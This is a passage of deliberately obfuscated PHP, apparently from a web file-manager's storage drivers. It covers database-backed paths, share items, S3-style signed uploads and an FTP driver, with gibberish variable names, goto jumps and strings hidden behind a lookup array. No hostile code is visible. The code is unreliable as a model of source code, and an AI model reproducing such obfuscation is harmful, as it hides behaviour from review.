$¯Ñ²’Ÿ×, $ƒ×§İØ§[1379] => $this->accessKey, $ƒ×§İØ§[1381] => $¼‡·Ï€, $ƒ×§İØ§[1382] => $áù¼ïí‰, $ƒ×§İØ§[196] => $this->getHost()); return $’ıõ°…; } public function fileOutLink($ê†˜Ğ¶¦) { $¹ªï‰à =& $_SERVER[Ö†ØøÖ±]; if (substr($ê†˜Ğ¶¦, 0, 7) == $¹ªï‰à[1383]) { $ê†˜Ğ¶¦ = $¹ªï‰à[1384] . substr($ê†˜Ğ¶¦, 7); } header($¹ªï‰à[162] . $ê†˜Ğ¶¦); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($È­‰¾¨±) { $this->pathParse = $È­‰¾¨±; $this->model = Model($_SERVER[Ö†ØøÖ±][1385]); } public function getPath($úÇÒ³ö§) { return trim($úÇÒ³ö§, $_SERVER[Ö†ØøÖ±][8]); } public function pathFather($£Œ„Ş“í) { $øûÔ¥£Ÿ = $this->parse($£Œ„Ş“í); $øûÔ¥£Ÿ = $this->infoSimple($£Œ„Ş“í); return $øûÔ¥£Ÿ ? $øûÔ¥£Ÿ[$_SERVER[Ö†ØøÖ±][180]] : !1; } public function pathThis($½ß—ş–‚) { $ÅˆÁñã = $this->infoSimple($½ß—ş–‚); return $ÅˆÁñã ? $ÅˆÁñã[$_SERVER[Ö†ØøÖ±][32]] : !1; } public function getPathOuter($®£Ë¹¾‘) { if (!$®£Ë¹¾‘) { return $®£Ë¹¾‘; } $Äìö³í• = $this->parse($®£Ë¹¾‘); return KodIO::make($Äìö³í•[$_SERVER[Ö†ØøÖ±][451]]); } public function copyFolderFromIO($¼Ú  Ã, $Õ³ø­Î, $¤öúÃî, $îÕì¸, $ºÆİ´) { $“Á¸·µ¤ = $this->model->copyFolderFromIO($¼Ú  Ã, $Õ³ø­Î, $¤öúÃî, $îÕì¸, $ºÆİ´); return KodIO::make($“Á¸·µ¤); } public function isParentOf($²·Õßµ, $¬«È±Î) { return $this->model->isParentOf($²·Õßµ, $¬«È±Î); } public function mkfile($ÚóÑ½Öß, $àğ†¼à¯ = '', $Ÿ½ï±¿ = REPEAT_RENAME) { $Åî÷ûşã =& $_SERVER[Ö†ØøÖ±]; $ùñ—Åø˜ = $this->parse($ÚóÑ½Öß); $ÚóÑ½Öß = $ùñ—Åø˜[$Åî÷ûşã[451]]; for ($¡ĞùöŞ« = 0; $¡ĞùöŞ« < count($ùñ—Åø˜[$Åî÷ûşã[1386]]); $¡ĞùöŞ«++) { $–‡ÖïÚÑ = $ùñ—Åø˜[$Åî÷ûşã[1386]][$¡ĞùöŞ«]; if ($¡ĞùöŞ« == count($ùñ—Åø˜[$Åî÷ûşã[1386]]) - 1) { $ÚóÑ½Öß = $this->model->mkfile($ÚóÑ½Öß, $–‡ÖïÚÑ, $àğ†¼à¯, $Ÿ½ï±¿); break; } $ÚóÑ½Öß = $this->model->mkdir($ÚóÑ½Öß, $–‡ÖïÚÑ, REPEAT_SKIP); } return $this->getPathOuter($ÚóÑ½Öß); } public function mkdir($¬ÈŒƒš¤, $°°«´Šõ = REPEAT_SKIP) { $ç”ë•óì =& $_SERVER[Ö†ØøÖ±]; $¼µ£‡ ñ = $this->parse($¬ÈŒƒš¤); $¬ÈŒƒš¤ = $¼µ£‡ ñ[$ç”ë•óì[451]]; for ($ÕÜÔ‚¤ = 0; $ÕÜÔ‚¤ < count($¼µ£‡ ñ[$ç”ë•óì[1386]]); $ÕÜÔ‚¤++) { $Èå‚ˆ¶Ü = $¼µ£‡ ñ[$ç”ë•óì[1386]][$ÕÜÔ‚¤]; $¬ÈŒƒš¤ = $this->model->mkdir($¬ÈŒƒš¤, $Èå‚ˆ¶Ü, $°°«´Šõ); } return $this->getPathOuter($¬ÈŒƒš¤); } public function copyFile($Ü¹âµ–ï, $¬Ä†¥²Ş, $ÅøÖ•« = REPEAT_REPLACE) { $¥Øò¡×¿ =& $_SERVER[Ö†ØøÖ±]; $„¹ıñí = $this->parse($¬Ä†¥²Ş); $ï“Ø«Ï½ = $this->model->copy($Ü¹âµ–ï, $„¹ıñí[$¥Øò¡×¿[451]], $ÅøÖ•«, $„¹ıñí[$¥Øò¡×¿[84]]); return $ï“Ø«Ï½ ? $this->getPathOuter($ï“Ø«Ï½) : !1; } public function moveFile($ËËš¡Â, $§ ½ˆºë, $Æ«×úß = REPEAT_REPLACE) { $»ş»š¦ =& $_SERVER[Ö†ØøÖ±]; $ìÀÂø¢ = $this->parse($§ ½ˆºë); $ã³Å²•ô = $this->model->move($ËËš¡Â, $ìÀÂø¢[$»ş»š¦[451]], $Æ«×úß, $ìÀÂø¢[$»ş»š¦[84]]); return $ã³Å²•ô ? $this->getPathOuter($ã³Å²•ô) : !1; } public function copy($¯Ëåì³°, $â×Âåâ¶, $º€³ËÜŞ = REPEAT_REPLACE, $†àñ“¬¦ = false) { $Áãèû² = $this->parse($â×Âåâ¶); $íøæÕ¬‡ = $this->model->copy($¯Ëåì³°, $Áãèû²[$_SERVER[Ö†ØøÖ±][451]], $º€³ËÜŞ, $†àñ“¬¦); return $íøæÕ¬‡ ? $this->getPathOuter($íøæÕ¬‡) : !1; } public function moveSameAllow() { } public function move($ö’¡¸±¡, $•”óÈä€, $¿ßœ÷õ¼ = REPEAT_REPLACE, $ÑÛƒÂæ½ = false) { $ãİå¹Ìò = $this->parse($•”óÈä€); $‰îÆÅüƒ = $this->model->move($ö’¡¸±¡, $ãİå¹Ìò[$_SERVER[Ö†ØøÖ±][451]], $¿ßœ÷õ¼, $ÑÛƒÂæ½); return $‰îÆÅüƒ ? $this->getPathOuter($‰îÆÅüƒ) : !1; } public function remove($©˜˜ì•™, $ÔšÒ = true) { return $this->model->remove($©˜˜ì•™, $ÔšÒ); } public function rename($È¿‹éÉä, $è¥ÁÌ§É) { $ˆÂÆåêú = $this->model->rename($È¿‹éÉä, $è¥ÁÌ§É); return $ˆÂÆåêú ? $this->getPathOuter($È¿‹éÉä) : $ˆÂÆåêú; } public function size($ôùµé¸…) { $Ğ€âšŞÙ = $this->infoSimple($ôùµé¸…); return $Ğ€âšŞÙ ? $Ğ€âšŞÙ[$_SERVER[Ö†ØøÖ±][76]] : 0; } public function infoSimple($ÅŞ†ñì’) { return $this->model->sourceInfo($ÅŞ†ñì’); } public function info($°ÌÍ‹†Œ) { return $this->infoParse($°ÌÍ‹†Œ); } public function infoAuth($Ä¨‚óˆ÷) { return $this->infoParse($Ä¨‚óˆ÷, !1, !0); } public function infoWithChildren($¬×•‡Ş‰) { return $this->infoParse($¬×•‡Ş‰, !0); } protected function infoParse($¼Ãü–, $ëÎ´¸•ë = false, $¬¬å¦›ä = false) { if (!$ëÎ´¸•ë) { return $this->model->pathInfo($¼Ãü–, $¬¬å¦›ä); } return $this->model->pathInfoMore($¼Ãü–); } public function infoFullSimple($±­ıûè) { $ÅÊÅ“•Ê =& $_SERVER[Ö†ØøÖ±]; $ó³¥š¿ = explode($ÅÊÅ“•Ê[8], $±­ıûè); $Ùù³•È = implode($ÅÊÅ“•Ê[8], array_splice($ó³¥š¿, 1)); return $this->model->pathInfoByPath($ó³¥š¿[0], $Ùù³•È); } public function infoFull($÷é¼÷™) { $ÔÓ÷èè³ = $this->infoFullSimple($÷é¼÷™); return is_array($ÔÓ÷èè³) ? $this->model->pathInfo($ÔÓ÷èè³[$_SERVER[Ö†ØøÖ±][181]]) : !1; } public function hashSimple($“¼£ıú) { $ööşÛÆ£ =& $_SERVER[Ö†ØøÖ±]; $üßÚëü = $this->infoWithChildren($“¼£ıú); return $üßÚëü[$ööşÛÆ£[525]][$ööşÛÆ£[649]]; } public function hashMd5($›¤’Ïˆù) { $µÈ¦úÛ =& $_SERVER[Ö†ØøÖ±]; $µşÇâ  = $this->infoWithChildren($›¤’Ïˆù); return $µşÇâ [$µÈ¦úÛ[525]][$µÈ¦úÛ[650]]; } public function exist($œ–¿¦ë) { $ìéÊß©¥ =& $_SERVER[Ö†ØøÖ±]; $Íöù¦Ş = $this->parse($œ–¿¦ë); if (!$Íöù¦Ş[$ìéÊß©¥[84]]) { return $this->isFile($œ–¿¦ë) || $this->isFolder($œ–¿¦ë); } $ÀÉé³“ = array($ìéÊß©¥[454] => $Íöù¦Ş[$ìéÊß©¥[451]], $ìéÊß©¥[32] => $Íöù¦Ş[$ìéÊß©¥[84]]); $¼İôÈ´– = $this->model->where($ÀÉé³“)->find(); return $¼İôÈ´– ? !0 : !1; } public function isFile($ìµ§Ÿ¿­) { $ä£¯£õÃ =& $_SERVER[Ö†ØøÖ±]; $Ş›ÖÛïÍ = $this->infoSimple($ìµ§Ÿ¿­); return $Ş›ÖÛïÍ && $Ş›ÖÛïÍ[$ä£¯£õÃ[462]] == $ä£¯£õÃ[212] ? !0 : !1; } public function isFolder($•ä„ §å) { $ûÛù‘¨‹ =& $_SERVER[Ö†ØøÖ±]; $•ÇÑ•Î° = $this->infoSimple($•ä„ §å); return $•ÇÑ•Î° && $•ÇÑ•Î°[$ûÛù‘¨‹[462]] == $ûÛù‘¨‹[88] ? !0 : !1; } public function listPath($­¹–èÇÒ, $Áï¥ÍŒÁ = false) { $Œ¬Æª‘Ç =& $_SERVER[Ö†ØøÖ±]; if ($­¹–èÇÒ == $Œ¬Æª‘Ç[12]) { return !1; } $Ù—ÌÈ¯ = array($Œ¬Æª‘Ç[454] => $­¹–èÇÒ); if ($Áï¥ÍŒÁ) { return $this->model->listSource($Ù—ÌÈ¯, -1); } return $this->model->listSource($Ù—ÌÈ¯); } public function has($Ä˜‘‚Äñ, $‰ı¦æŠ‚ = false, $ÓÑ»±îÊ = null) { $´ÇİÖ” =& $_SERVER[Ö†ØøÖ±]; $÷³Èê¾û = $this->infoWithChildren($Ä˜‘‚Äñ); if ($‰ı¦æŠ‚) { return array($´ÇİÖ”[224] => $÷³Èê¾û[$´ÇİÖ”[224]], $´ÇİÖ”[223] => $÷³Èê¾û[$´ÇİÖ”[223]]); } return $ÓÑ»±îÊ ? $÷³Èê¾û[$´ÇİÖ”[224]] : $÷³Èê¾û[$´ÇİÖ”[223]]; } public function listAll($¿ô÷–Ìû) { $Ì‡é±”¦ = IO::info($this->pathParse[$_SERVER[Ö†ØøÖ±][84]]); if (!$Ì‡é±”¦) { return array(); } return $this->model->listAll($¿ô÷–Ìû); } public function getContent($ì’îè¹×) { return $this->model->getContent($ì’îè¹×); } public function setContent($Î—í‚éÑ, $¶©ÛÀŠº = '') { return $this->model->setContent($Î—í‚éÑ, $¶©ÛÀŠº); } public function fileSubstr($¨ÛÕÀ¦¥, $Ú½Â®‚œ, $¬ÊÊù‹) { return $this->model->fileSubstr($¨ÛÕÀ¦¥, $Ú½Â®‚œ, $¬ÊÊù‹); } public function download($¸Ÿ›òÁí, $œ˜—±›‹ = '') { $Ú±æÌ† = get_path_father($œ˜—±›‹); $€û¡¿… = get_path_this($œ˜—±›‹); $²š»ìş¸ = $this->model->fileInfoGet($¸Ÿ›òÁí); $ÖßŞ¤Á = IO::copy($²š»ìş¸[$_SERVER[Ö†ØøÖ±][84]], $Ú±æÌ†, !1, $€û¡¿…); return $ÖßŞ¤Á; } public function setModifyTime($ˆ²ƒò›©, $‘²“‡ö = '') { $¶á¼Çœß =& $_SERVER[Ö†ØøÖ±]; if (!$ˆ²ƒò›©) { return; } $this->model->where(array($¶á¼Çœß[468] => $ˆ²ƒò›©))->save(array($¶á¼Çœß[85] => $‘²“‡ö)); } public function upload($»…¿³¼, $¯àáìƒ, $’ŸÕ…Ü = false, $†ÍôüÍ€ = REPEAT_REPLACE) { $´õãÙşÊ =& $_SERVER[Ö†ØøÖ±]; $†“äÔ·„ = $this->parse($»…¿³¼); $¿ø±Õ¦ = $this->model->addFile($†“äÔ·„[$´õãÙşÊ[451]], $¯àáìƒ, $†“äÔ·„[$´õãÙşÊ[84]], $’ŸÕ…Ü, $†ÍôüÍ€); return $this->getPathOuter($¿ø±Õ¦); } public function uploadFileByID($Ğ‰ÃåÄô, $ï§œÌÈÅ, $¿×Æèö’) { $ÛñÜ¹ú½ =& $_SERVER[Ö†ØøÖ±]; $ì´åëßì = $this->parse($Ğ‰ÃåÄô); $Å­ú£á = $this->model->addFileByFileID($ì´åëßì[$ÛñÜ¹ú½[451]], $ï§œÌÈÅ, $ì´åëßì[$ÛñÜ¹ú½[84]], $¿×Æèö’); return $this->getPathOuter($Å­ú£á); } public function addFileByRemote($ÓÆåÍ, $èèìùÓß, $ğç¢ûµˆ = array(), $éàÇğÉª = '', $ÛòµÀù) { $ç¡Ü÷˜– =& $_SERVER[Ö†ØøÖ±]; $¾÷ƒ²Ò = $this->parse($ÓÆåÍ); $éàÇğÉª = empty($éàÇğÉª) ? $¾÷ƒ²Ò[$ç¡Ü÷˜–[84]] : $éàÇğÉª; $õÀâ«™å = $this->model->addFileByRemote($¾÷ƒ²Ò[$ç¡Ü÷˜–[451]], $èèìùÓß, $éàÇğÉª, $ğç¢ûµˆ, $ÛòµÀù); return $this->getPathOuter($õÀâ«™å); } public function uploadLink($¦Á‰«÷å, $à¶Î‹µ§ = 0) { $ËŸğòíÔ =& $_SERVER[Ö†ØøÖ±]; $™©Ò±ùÓ = $this->parse($¦Á‰«÷å); $‚ÀÚ¨³ñ = _get($GLOBALS[$ËŸğòíÔ[7]], $ËŸğòíÔ[1387]); $æ¼…‘Á = _get($GLOBALS[$ËŸğòíÔ[7]], $ËŸğòíÔ[1388]); $¦Á‰«÷å = Model($ËŸğòíÔ[652])->createFileName($™©Ò±ùÓ[$ËŸğòíÔ[84]], $‚ÀÚ¨³ñ, $æ¼…‘Á); return IO::uploadLink($¦Á‰«÷å, $à¶Î‹µ§); } public function fileNameAuto($ğÊÔÊ¼, $»Ó¾¶‹Ç, $‰ììğÜ = REPEAT_REPLACE, $ÚÙ˜äà = false) { return $this->model->fileNameAuto($ğÊÔÊ¼, $»Ó¾¶‹Ç, $‰ììğÜ, $ÚÙ˜äà); } public function fileNameExist($’ôºàÇ½, $â“–å¸‰) { return $this->model->fileNameExist($’ôºàÇ½, $â“–å¸‰); } protected function _fileOut($ÒˆÎÃ÷, $ç„¢É = false, $ÏÍ„ÎÃß = false, $îÓÌ­‘ª = '', $Íü¸¢¤¢ = false) { $ŠÖ¡¢Ú’ =& $_SERVER[Ö†ØøÖ±]; $½Í‹øî = $this->model->sourceInfo($ÒˆÎÃ÷); if ($½Í‹øî[$ŠÖ¡¢Ú’[462]] == $ŠÖ¡¢Ú’[88]) { header($ŠÖ¡¢Ú’[1389]); die; } $‹ÌøÂä§ = $this->model->fileInfoGet($ÒˆÎÃ÷); $îÓÌ­‘ª = $‹ÌøÂä§[$ŠÖ¡¢Ú’[650]] ? $‹ÌøÂä§[$ŠÖ¡¢Ú’[650]] : $îÓÌ­‘ª; $…†ÓùøÖ = is_array($GLOBALS[$ŠÖ¡¢Ú’[169]]) ? $GLOBALS[$ŠÖ¡¢Ú’[169]][$ŠÖ¡¢Ú’[32]] : $½Í‹øî[$ŠÖ¡¢Ú’[32]]; if ($Íü¸¢¤¢) { return IO::fileOutServer($‹ÌøÂä§[$ŠÖ¡¢Ú’[84]], $ç„¢É, $…†ÓùøÖ, $îÓÌ­‘ª); } IO::fileOut($‹ÌøÂä§[$ŠÖ¡¢Ú’[84]], $ç„¢É, $…†ÓùøÖ, $îÓÌ­‘ª); } public function fileOut($Èó§¦û, $Íá¿ˆ¨Æ = false, $—´ú´¢º = false, $ ¦Âè = '') { $this->_fileOut($Èó§¦û, $Íá¿ˆ¨Æ, $—´ú´¢º, $ ¦Âè); } public function fileOutServer($óæ§š, $÷óõˆ¡Â = false, $“ÕÍ´ÍÈ = false, $ù½ï€ = '') { $this->_fileOut($óæ§š, $÷óõˆ¡Â, $“ÕÍ´ÍÈ, $ù½ï€, !0); } protected function _fileOutImage($Äìã·À‘, $ÁÂ™ÔÍÖ = 250) { $¨îªÈšè =& $_SERVER[Ö†ØøÖ±]; $Æë•·™Ú = $this->model->pathInfo($Äìã·À‘); if ($Æë•·™Ú[$¨îªÈšè[462]] == $¨îªÈšè[88]) { show_json($¨îªÈšè[1390] . $Äìã·À‘, !1); } $¹¡§¸éá = $this->model->fileInfoGet($Äìã·À‘); $Æë•·™Ú[$¨îªÈšè[170]] = $¹¡§¸éá[$¨îªÈšè[84]]; $GLOBALS[$¨îªÈšè[169]] = $Æë•·™Ú; IO::fileOutImage($¹¡§¸éá[$¨îªÈšè[84]], $ÁÂ™ÔÍÖ); } public function fileOutImage($·‡Á†Ø¸, $Ãß“¥ = 250) { $this->_fileOutImage($·‡Á†Ø¸, $Ãß“¥); } public function fileOutImageServer($Ÿçäş€…, $‡¤£——§ = 250) { $this->_fileOutImage($Ÿçäş€…, $‡¤£——§); } public function link($÷…€³‹¦, $Óåîëœî = '') { $¢Îá°Ã« = $this->model->fileInfoGet($÷…€³‹¦); return IO::link($¢Îá°Ã«[$_SERVER[Ö†ØøÖ±][84]], $Óåîëœî); } protected function parse($¤«è¬Ş) { $Éûê•©“ =& $_SERVER[Ö†ØøÖ±]; if (strstr($¤«è¬Ş, $Éûê•©“[8]) === !1) { return array($Éûê•©“[470] => intval($¤«è¬Ş), $Éûê•©“[84] => $Éûê•©“[12], $Éûê•©“[1386] => array()); } $×­»¹´‘ = explode($Éûê•©“[8], trim($¤«è¬Ş, $Éûê•©“[8])); if (count($×­»¹´‘) < 2) { show_tips(clear_html($¤«è¬Ş) . $Éûê•©“[1391]); } return array($Éûê•©“[470] => intval($×­»¹´‘[0]), $Éûê•©“[84] => $×­»¹´‘[1], $Éûê•©“[1386] => array_slice($×­»¹´‘, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($„å–¦‰Ã) { $this->pathParse = $„å–¦‰Ã; $this->model = Model($_SERVER[Ö†ØøÖ±][1385]); } public function getPathOuter($î‹•™³) { $¤èÇ¶ê =& $_SERVER[Ö†ØøÖ±]; if (!$î‹•™³) { return $î‹•™³; } $®ÚÌØº¢ = $this->parse($î‹•™³); return trim(KodIO::makeShare($this->pathParse[$¤èÇ¶ê[451]], $®ÚÌØº¢[$¤èÇ¶ê[451]]), $¤èÇ¶ê[8]); } protected function infoParse($û‹‚Óî§, $•¾È¥‡ß = false, $ ñçÏÅ = false) { $Îö²ëŒ =& $_SERVER[Ö†ØøÖ±]; $‰¹áÄ¹ = $this->pathParse[$Îö²ëŒ[451]]; $¨ª¼ƒï² = trim($this->pathParse[$Îö²ëŒ[1221]], $Îö²ëŒ[8]); return Action($Îö²ëŒ[1392])->sharePathInfo($‰¹áÄ¹, $¨ª¼ƒï², $•¾È¥‡ß); } public function infoFull($öóæïÏå) { $­Î™Óõ =& $_SERVER[Ö†ØøÖ±]; $¶ğÃ¸ç = explode($­Î™Óõ[8], trim($öóæïÏå, $­Î™Óõ[8])); if (count($¶ğÃ¸ç) > 1) { $’ßŞû‰€ = implode($­Î™Óõ[8], array_splice($¶ğÃ¸ç, 1)); $üµ¼ã‰Ï = $this->model->pathInfoByPath($¶ğÃ¸ç[0], $’ßŞû‰€); if (!$üµ¼ã‰Ï) { return !1; } $this->pathParse[$­Î™Óõ[1221]] = $üµ¼ã‰Ï[$­Î™Óõ[181]]; } return $this->infoParse($öóæïÏå); } public function listAll($¸‹µ±À) { $âÚñ—¸¹ =& $_SERVER[Ö†ØøÖ±]; $ìÀ¸¦Š‡ = IO::info($this->pathParse[$âÚñ—¸¹[84]]); if (!$ìÀ¸¦Š‡) { return array(); } $¹Ä‰÷ø = $this->model->listAll($¸‹µ±À); $·İ×‰İé = Model($âÚñ—¸¹[641])->getInfo($ìÀ¸¦Š‡[$âÚñ—¸¹[642]]); foreach ($¹Ä‰÷ø as &$Ì¼Â³ãñ) { check_abort(); $Ì¼Â³ãñ[$âÚñ—¸¹[87]] = Action($âÚñ—¸¹[1392])->_shareItemeParse($Ì¼Â³ãñ[$âÚñ—¸¹[87]], $·İ×‰İé); } unset($Ì¼Â³ãñ); return $¹Ä‰÷ø; } } goto b£ğ°Èáá; Cˆ½¸ÎÌ®: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\x65\155\117\x70\x74\x69\157\156"; public $field = array(); public function listData($œ·¹‹Ô  = false, $“Û—äï¯ = "\155\x6f\x64\151\146\x79\124\151\155\x65", $Îèá×õ = false) { $‡…îÛ‘Ó = Model($this->modelType)->get(!1, $this->optionType, !0); $¯Ã¼Œğ = array_values($‡…îÛ‘Ó); if ($¯Ã¼Œğ && $¯Ã¼Œğ[0] && !is_array($¯Ã¼Œğ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $‡…îÛ‘Ó = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$‡…îÛ‘Ó) { return $œ·¹‹Ô  ? null : array(); } if (!$œ·¹‹Ô ) { $‡…îÛ‘Ó = array_filter(array_values($‡…îÛ‘Ó)); return array_sort_by($‡…îÛ‘Ó, $“Û—äï¯, $Îèá×õ); } return $‡…îÛ‘Ó[$_SERVER[Ö†ØøÖ±][448] . $œ·¹‹Ô ]; } public function insert($ºúÍ³Ë„) { $–Ş˜‚”Ú =& $_SERVER[Ö†ØøÖ±]; $ºúÍ³Ë„ = array_field_key($ºúÍ³Ë„, $this->field); $ÍşØå«æ = Model($this->modelType)->get($–Ş˜‚”Ú[449], $this->optionType . $–Ş˜‚”Ú[450]); $ÍşØå«æ = $ÍşØå«æ ? $ÍşØå«æ : 0; $ºúÍ³Ë„[$–Ş˜‚”Ú[451]] = ++$ÍşØå«æ; $ºúÍ³Ë„[$–Ş˜‚”Ú[215]] = time(); $ºúÍ³Ë„[$–Ş˜‚”Ú[85]] = time(); Model($this->modelType)->set($–Ş˜‚”Ú[449], $ÍşØå«æ, $this->optionType . $–Ş˜‚”Ú[450]); Model($this->modelType)->set($–Ş˜‚”Ú[448] . $ÍşØå«æ, $ºúÍ³Ë„, $this->optionType); return $ÍşØå«æ; } public function update($á–±ª’, $ Æ×Ìé÷) { $ÆÏÙ“õæ =& $_SERVER[Ö†ØøÖ±]; $ Æ×Ìé÷ = array_field_key($ Æ×Ìé÷, $this->field); $¿¨Â¯°› = $this->listData($á–±ª’); if (!$¿¨Â¯°› || !$á–±ª’) { return !1; } $ Æ×Ìé÷ = array_merge($¿¨Â¯°›, $ Æ×Ìé÷); $ Æ×Ìé÷[$ÆÏÙ“õæ[85]] = time(); return Model($this->modelType)->set($ÆÏÙ“õæ[448] . $á–±ª’, $ Æ×Ìé÷, $this->optionType); } public function remove($©ÓÆÕ¤) { if (!$©ÓÆÕ¤) { return !1; } return Model($this->modelType)->remove($_SERVER[Ö†ØøÖ±][448] . $©ÓÆÕ¤, $this->optionType); } public function clear() { $…ûœí‡µ =& $_SERVER[Ö†ØøÖ±]; Model($this->modelType)->remove($…ûœí‡µ[449], $this->optionType . $…ûœí‡µ[450]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ÖÂ‘îÉÃ, $‡éğòœø) { if (!$‡éğòœø) { return !1; } $Ò¥£Ôíú = $this->listData(); $Ò¥£Ôíú = array_to_keyvalue($Ò¥£Ôíú, $ÖÂ‘îÉÃ); return isset($Ò¥£Ôíú[$‡éğòœø]) ? $Ò¥£Ôíú[$‡éğòœø] : !1; } public function findByName($¡ŠıÆ‰) { return $this->findByKey($_SERVER[Ö†ØøÖ±][32], $¡ŠıÆ‰); } protected function resetData($ŞùÛùöÄ) { $Èš¸ †’ =& $_SERVER[Ö†ØøÖ±]; $ŞùÛùöÄ = is_array($ŞùÛùöÄ) ? $ŞùÛùöÄ : array(); $Ãø„Ó™ = array(); for ($…ş‚ì = 0; $…ş‚ì < count($ŞùÛùöÄ); $…ş‚ì++) { $Ãø„Ó™[$Èš¸ †’[448] . $ŞùÛùöÄ[$…ş‚ì][$Èš¸ †’[451]]] = $ŞùÛùöÄ[$…ş‚ì]; } return Model($this->modelType)->set($Ãø„Ó™, !1, $this->optionType); } private function getAutoName($Ñ¬õ¯üø) { $•üÁÏÇ = array_to_keyvalue($this->listData(), $_SERVER[Ö†ØøÖ±][32]); if (!$•üÁÏÇ || !isset($•üÁÏÇ[$Ñ¬õ¯üø])) { return $Ñ¬õ¯üø; } for ($›‡ÄÚª = 1; $›‡ÄÚª < count($•üÁÏÇ); $›‡ÄÚª++) { $É”ßÛÇ¦ = $Ñ¬õ¯üø . "\x28{$›‡ÄÚª}\x29"; if (!isset($•üÁÏÇ[$É”ßÛÇ¦])) { return $É”ßÛÇ¦; } } return $É”ßÛÇ¦; } } $_file = $_SERVER[$_SERVER[Ö†ØøÖ±][289]]; $_size = $_SERVER[Ö†ØøÖ±][452]; goto aã›š„‘‘; FÀ™İ’ê‰á: class PathDriverEDS extends PathDriverMinIO { public function __construct($úÚ´ùÎĞ) { parent::__construct($úÚ´ùÎĞ); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¢à°É²Ê) { parent::__construct($¢à°É²Ê); $this->signatureVersion($_SERVER[Ö†ØøÖ±][231]); } public function uploadFormData($°Æ×Ï’Õ, $Ó¤åïç„ = 3600) { $ª¯ÀƒŒË =& $_SERVER[Ö†ØøÖ±]; $œ‚©¢¦È = $ª¯ÀƒŒË[213]; $Î¥¡«­× = $ª¯ÀƒŒË[253]; $·°õò¸‹ = $ª¯ÀƒŒË[62]; $™è§ˆœ = gmdate($ª¯ÀƒŒË[254]); $æşÀÏçê = gmdate($ª¯ÀƒŒË[255]); $õé×‡‘Ü = $ª¯ÀƒŒË[256]; $ÃˆŒ™† = $Ó¤åïç„ . $ª¯ÀƒŒË[12]; $ï•®ìÃ˜ = $ª¯ÀƒŒË[257]; $æ¦ëÊÖø = array($this->accessKey, $æşÀÏçê, $this->region, $·°õò¸‹, $õé×‡‘Ü); $†®ñ¼‘¯ = implode($ª¯ÀƒŒË[8], $æ¦ëÊÖø); $ƒ½ú÷Ô = array($ª¯ÀƒŒË[258] => gmdate($ª¯ÀƒŒË[1377], strtotime($ª¯ÀƒŒË[260])), $ª¯ÀƒŒË[261] => array(array($ª¯ÀƒŒË[262] => $this->bucket), array($ª¯ÀƒŒË[263] => $œ‚©¢¦È), array($ª¯ÀƒŒË[264], $ª¯ÀƒŒË[265], $ª¯ÀƒŒË[12]), array($ª¯ÀƒŒË[264], $ª¯ÀƒŒË[266], $ª¯ÀƒŒË[12]), array($ª¯ÀƒŒË[264], $ª¯ÀƒŒË[267], $ª¯ÀƒŒË[12]), array($ª¯ÀƒŒË[268] => $ï•®ìÃ˜), array($ª¯ÀƒŒË[269] => $†®ñ¼‘¯), array($ª¯ÀƒŒË[270] => $Î¥¡«­×), array($ª¯ÀƒŒË[271] => $™è§ˆœ), array($ª¯ÀƒŒË[272] => $ÃˆŒ™†))); $·ŞÑƒÆÁ = base64_encode(json_encode($ƒ½ú÷Ô)); $ğ×Û‡¬“ = hash_hmac($ª¯ÀƒŒË[273], $æşÀÏçê, $ª¯ÀƒŒË[274] . $this->secret, !0); $‡¼µ”ÛÛ = hash_hmac($ª¯ÀƒŒË[273], $this->region, $ğ×Û‡¬“, !0); $˜Õ²ÙÊç = hash_hmac($ª¯ÀƒŒË[273], $·°õò¸‹, $‡¼µ”ÛÛ, !0); $÷ùáÅ² = hash_hmac($ª¯ÀƒŒË[273], $õé×‡‘Ü, $˜Õ²ÙÊç, !0); $µ˜‚Ğê” = hash_hmac($ª¯ÀƒŒË[273], $·ŞÑƒÆÁ, $÷ùáÅ²); $¸ô·òá’ = array($ª¯ÀƒŒË[230] => $ª¯ÀƒŒË[12], $ª¯ÀƒŒË[275] => $ª¯ÀƒŒË[12], $ª¯ÀƒŒË[263] => $œ‚©¢¦È, $ª¯ÀƒŒË[268] => $ï•®ìÃ˜, $ª¯ÀƒŒË[276] => $·ŞÑƒÆÁ, $ª¯ÀƒŒË[277] => $†®ñ¼‘¯, $ª¯ÀƒŒË[278] => $Î¥¡«­×, $ª¯ÀƒŒË[279] => $™è§ˆœ, $ª¯ÀƒŒË[280] => $ÃˆŒ™†, $ª¯ÀƒŒË[281] => $µ˜‚Ğê”, $ª¯ÀƒŒË[196] => $this->getHost()); return $¸ô·òá’; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($³¾¢Ãì†) { parent::__construct(); if (count($³¾¢Ãì†) > 0) { $this->_init($³¾¢Ãì†); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Š¼¤œø) { $¹ûÇƒóê =& $_SERVER[Ö†ØøÖ±]; global $config; $this->appCharset = $config[$¹ûÇƒóê[1403]]; $this->systemCharset = $config[$¹ûÇƒóê[1404]]; if (isset($Š¼¤œø[$¹ûÇƒóê[1405]]) && $Š¼¤œø[$¹ûÇƒóê[1405]]) { $this->systemCharset = $Š¼¤œø[$¹ûÇƒóê[1405]]; } } public function iconvApp($ÄÅò ‡İ) { return $this->iconvTo($ÄÅò ‡İ, $this->systemCharset, $this->appCharset); } public function iconvSystem($ä’Â£å) { return $this->iconvTo($ä’Â£å, $this->appCharset, $this->systemCharset); } public function getPathOuter($çÇ§¬½) { $è şÚç¬ =& $_SERVER[Ö†ØøÖ±]; $î¨Õ…·‚ = $this->iconvApp($this->pathBase); $çÇ§¬½ = $this->iconvApp($çÇ§¬½); if (substr($î¨Õ…·‚, 0, 2) == $è şÚç¬[1406]) { $î¨Õ…·‚ = BASIC_PATH . substr($î¨Õ…·‚, 2); } if (substr($çÇ§¬½, 0, 2) == $è şÚç¬[1406]) { $çÇ§¬½ = BASIC_PATH . substr($çÇ§¬½, 2); } $î¨Õ…·‚ = 